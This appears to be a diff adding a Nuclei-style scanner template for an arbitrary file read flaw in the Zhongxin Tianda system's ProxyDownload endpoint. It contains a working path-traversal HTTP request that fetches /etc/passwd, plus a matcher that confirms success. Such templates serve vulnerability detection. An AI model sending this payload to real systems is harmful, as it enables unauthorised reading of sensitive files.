@@ -1,0 +1,26 @@
+id: zxtd-proxydownload-fileread
+
+info:
+  name: ZXTD ProxyDownload - Arbitrary File Read
+  author: qwtd
+  severity: high
+  description: |-
+    中新天达系统/aexp/ProxyDownload存在任意文件读取漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。
+  reference:
+    - https://github.com/wy876/POC/blob/main/EDU/%E4%B8%AD%E6%96%B0%E5%A4%A9%E8%BE%BE%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  tags: 中新天达
+
+http:
+  - raw:
+      - |
+        GET /aexp/ProxyDownload?path=/speedec/webapps/webftp/../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
